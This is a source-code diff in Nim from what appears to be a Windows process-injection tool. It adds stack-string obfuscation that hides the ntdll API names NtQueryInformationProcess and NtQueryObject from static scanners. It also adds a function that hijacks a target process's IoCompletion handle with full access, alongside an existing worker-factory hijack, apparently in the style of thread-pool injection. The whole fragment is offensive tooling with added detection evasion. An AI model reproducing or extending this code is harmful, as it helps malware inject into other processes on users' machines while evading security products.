@@ -15,6 +15,8 @@ template label*(name, body) =
 template goto*(name) =
   {.emit: "goto " & astToStr(name) & ";".}
 
+template LPCPTR*(s: untyped): LPCSTR = cast[LPCSTR](s[0].addr)
+
 #[ 
   Process Handle Objects
 ]#
@@ -512,15 +514,18 @@ proc hijackProcessHandle(tProcess: HANDLE, typeName: LPWSTR, desiredAccess: uint
     totalHandles, handleInfoSize: int
     status: NTSTATUS
     duplicatedHandle: HANDLE
+    sNtdll {.stackStringA.} = "NTDLL.DLL"
+    sNtQueryInformationProcess {.stackStringA.} = "NtQueryInformationProcess"
+    sNtQueryObject {.stackStringA.} = "NtQueryObject"
 
   let 
     pNtQueryInformationProcess = cast[NtQueryInformationProcess](
         ninst.Win32.GetProcAddress(
-            ninst.Win32.GetModuleHandleA("NTDLL.DLL"), "NtQueryInformationProcess")
+            ninst.Win32.GetModuleHandleA(LPCPTR(sNtdll)), LPCPTR(sNtQueryInformationProcess))
     )
     pNtQueryObject = cast[NtQueryObject](
         ninst.Win32.GetProcAddress(
-            ninst.Win32.GetModuleHandleA("NTDLL.DLL"), "NtQueryObject")
+            ninst.Win32.GetModuleHandleA(LPCPTR(sNtdll)), LPCPTR(sNtQueryObject))
     )
   
   if pNtQueryInformationProcess == nil or pNtQueryObject == nil:
@@ -586,3 +591,7 @@ proc hijackProcessHandle(tProcess: HANDLE, typeName: LPWSTR, desiredAccess: uint
 proc hijackProcessWorkerFactory*(processHandle: HANDLE): HANDLE =
   let target {.stackStringW.} = "TpWorkerFactory"
   return hijackProcessHandle(processHandle, cast[LPWSTR](target[0].addr), WORKER_FACTORY_ALL_ACCESS)
+
+proc hijackProcessIoPort*(processHandle: HANDLE): HANDLE = 
+  let target {.stackStringW.} = "IoCompletion"
+  return hijackProcessHandle(processHandle, cast[LPWSTR](target[0].addr), IO_COMPLETION_ALL_ACCESS)
